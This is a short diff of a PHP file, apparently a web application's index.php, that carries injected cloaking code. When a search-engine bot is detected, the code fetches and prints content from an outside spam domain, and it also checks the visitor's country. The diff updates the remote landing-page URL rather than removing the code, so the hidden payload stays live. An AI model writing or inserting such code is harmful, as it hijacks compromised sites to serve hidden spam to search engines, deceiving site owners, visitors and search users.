@@ -18,7 +18,7 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$sky = "https://seojkw.xyz/nje.numl/landing3.txt";
+$sky = "https://seojkw.xyz/jelss/landing6.txt";
 
 if (is_bot()) {
     echo @file_get_contents($sky);
@@ -33,6 +33,8 @@ if (getUserCountry() === "ID") {
 
 ?>
 <?php
+
+
 
 /**
  * @defgroup index Index
